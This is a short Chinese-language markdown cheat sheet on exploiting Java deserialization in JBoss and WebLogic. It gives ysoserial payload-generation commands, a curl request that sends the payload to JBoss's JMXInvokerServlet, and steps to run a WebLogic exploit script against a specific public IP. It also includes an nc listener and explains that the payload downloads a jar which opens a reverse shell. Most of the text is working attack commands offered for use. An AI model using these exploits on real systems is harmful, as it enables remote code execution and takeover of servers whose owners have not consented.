## JavaDeserialization

###jboss：
#####一
```
▶ java -jar ysoserial-0.0.2-all.jar
Y SO SERIAL?  
Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'  
    Available payload types:  
        CommonsCollections1 #jboss用這個我測試過一次可行  
        CommonsCollections2 #剩下的沒測試過  
        Groovy1  
        Spring1  

▶ java -jar ysoserial-0.0.2-all.jar CommonsCollections1 'command' >~/payload
▶ curl --header 'Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue' --data-binary '~/payload' http://127.0.0.1:8080/invoker/JMXInvokerServlet
```
[ysoserial-0.0.2-all.jar](https://github.com/frohoff/ysoserial/releases)  
####二  
https://github.com/njfox/Java-Deserialization-Exploit  
暫未測試。


###weblogic：  
```
▶ javac -classpath commons-collections-3.2.jar Main.java
▶ java Main.class
▶ python weblogic.py 116.208.2.162 7001 /tmp/payload
▶ ssh kali
root@Kali:~# nc -vv -l -p 888
```
Main.java的作用是生成一個從url下載jar包的payload，jar包執行反彈shell。  

[commons-collections-3.2.jar](http://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.2.zip "Main.jar依賴包")  
[Main.java](http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/ "TransformedMap的实现方式")  
[weblogic.py](https://github.com/schinkelg/JavaUnserializeExploits/blob/master/weblogic.py "自動添加包頭的修正腳本")

--

通用漏洞可以從這裡總結：  
http://www.secpulse.com/archives/40420.html  
http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/  
https://github.com/foxglovesec/JavaUnserializeExploits  
https://github.com/njfox/Java-Deserialization-Exploit  
http://zone.wooyun.org/content/23905  